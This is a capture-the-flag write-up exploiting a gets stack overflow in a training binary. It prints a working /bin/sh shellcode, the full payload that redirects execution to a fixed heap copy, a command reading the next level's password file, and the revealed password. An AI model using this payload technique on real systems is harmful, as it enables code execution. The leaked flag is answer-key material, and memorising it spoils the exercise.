## LEVEL 2
---

As usually, I start the level by using gdb and take a look on the functions we have.

```shell
(gdb) i func
All defined functions:
[...]
0x080484d4  p
0x0804853f  main
[...]
```

So we have two functions `p` and `main`, main is almost empty and it's only used to run `p`. So I will only talk about `p` during this level. Let's see what `p` does. I will only show the most interesting functions if you want to have the all function and the `main` function [click here](asm/level1.asm).

```shell
0x080484d7 <+3>:	sub    $0x68,%esp ; Allocate 104 bytes
[...]
0x080484ed <+25>:	call   0x80483c0 <gets@plt> ; Call gets and store in stack
[...]
0x080484f2 <+30>:	mov    0x4(%ebp),%eax ; Save the return address in eax register
[...]
0x080484fb <+39>:	and    $0xb0000000,%eax
0x08048500 <+44>:	cmp    $0xb0000000,%eax ; Check if return value is in the stack
0x08048505 <+49>:	jne    0x8048527 <p+83> ; Return if is in the stack
[...]
0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
0x0804852a <+86>:	mov    %eax,(%esp)
0x0804852d <+89>:	call   0x80483f0 <puts@plt> ; Print the buffer
[...]
0x08048535 <+97>:	mov    %eax,(%esp)
0x08048538 <+100>:	call   0x80483e0 <strdup@plt> ; Copy the buffer
0x0804853d <+105>:	leave
0x0804853e <+106>:	ret
```

First thing I notice is that we don't have any calls to `execve` or `system`. That means I have to run a shell by using a shellcode *(shell code is an ASM code translated into bytecode that launches a shell terminal)*.

The second thing is that we have a `gets` call to overflow the buffer and change the return address.

Sadly, we have a problem.

```shell
(gdb) i proc mapping
process 4836
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
[...]
    0x804a000  0x806b000    0x21000        0x0 [heap]
[...]
    0xbffdf000 0xc0000000    0x21000        0x0 [stack]
```

The condition at line 44 is here to check that our shellcode is inside the heap, but `gets` stores the input inside the stack. So when I change the return address to my shellcode inside the stack, the program will exit.

To solve this problem, the virtual machine helps us! When I logged into the virtual machine, I saw this message: `System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)`. That means that the addresses where variables are stored on the stack and heap are the same every time you start the executable. That means that in our case, `strdup` will store a copy of our buffer always at the same address. So I will write a shellcode that overflows the buffer to overwrite the address of the copy of the shellcode in place of the return address. Our executable will jump to the shellcode at the end of the function without being blocked by the condition.

It's time to create our payload !

---

First I search a shellcode, to do that I use [this](https://shell-storm.org/shellcode/index.html) website. Here is my shellcode :
`\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80`.

Then I need to find the return address of the `p` function.

`EIP address = ($ebp + 4) - ($ebp - 4c) = 80`

And finally the address return by `strcpy`.

```shell
(gdb) disas p
[...]
0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
=> 0x0804853d <+105>:	leave
[...]
x $eax
0x804a008:	0x61616161
```

Now here is my payload : `"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*59 + "\x08\xa0\x04\x08"'`

```shell
$ (python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*59 + "\x08\xa0\x04\x08"') > /tmp/payload
$ (cat /tmp/payload; echo "cat /home/user/level3/.pass") | ./level2
j
 X�Rh//shh/bin��1�̀������������������������������������������������������
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
